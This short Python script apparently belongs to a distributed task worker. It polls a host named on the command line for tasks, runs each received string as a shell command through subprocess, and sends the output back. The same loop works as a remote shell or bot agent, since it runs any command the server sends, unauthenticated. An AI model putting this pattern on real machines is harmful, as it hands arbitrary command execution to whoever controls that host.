#coding:utf-8
import sys
import time
import subprocess
import answer
import mylog
'''
循环发送任务申请，得到任务并执行
'''
i=0
port2 = 10413
port = 10412
host = sys.argv[1]

while True:
    #:发送接入请求任务
    data = answer.send(host,port,'join')
    if data == 'error':
        mylog.log('connect is failed','0')
        break
    if data == 'done':
        #:接收到done，证明任务结束或没有任务，等待5s
        time.sleep(5)
        print('done')
        continue
    #:获取接收到的信息
    msg = data.split('&')
    run = msg[0]
    ids = msg[1]
    #:执行获得的任务
    (status,output) = subprocess.getstatusoutput(run)
    #:发送执行之后的结果
    get = answer.send(host,port2,output + '&' + ids)
    #:判断结果是否发送成功
    '''if get == 'success':
        #:打印日志
        mylog.log(get,ids)
    else:
        mylog.log(get,ids)
    '''
    #:打印日志
    mylog.log(get,ids)
